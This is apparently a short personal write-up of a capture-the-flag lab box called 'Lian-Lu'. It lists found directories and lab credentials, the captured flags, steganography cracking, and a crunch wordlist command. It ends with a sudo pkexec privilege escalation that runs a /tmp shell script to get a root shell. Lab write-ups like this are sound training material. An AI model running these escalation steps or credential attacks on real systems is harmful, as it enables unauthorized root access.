# Lian-Lu

I.P -  10.10.218.237

Found web directories:
/island
(Found code vigilante )

created a custom wordlist by using: crunch 4 4 1234567890 -o wordlist.txt

RTy8yhBQdscX

password for ftp.vigilante : !#th3h00d
get to download all images
.other_user was also found which revealed slade as a user

Using stegcracker
to attack all files bt only .jpg was supported

found shadow and shado files
found a password in shado: M3tahuman

tried the password in ssh with users shado and slade

slade worked and user.txt is :
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

found by sudo -l that slade can run /usr/bin/pkexec

created a shell.sh file in /tmp folder with contents:(/tmp/shell.sh)
#!/bin/bash
/bin/bash

saved and ran:

chmod 700 /tmp/shell.sh
sudo pkexec /tmp/shell.sh

and had a root shell

and root.txt was:

[_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}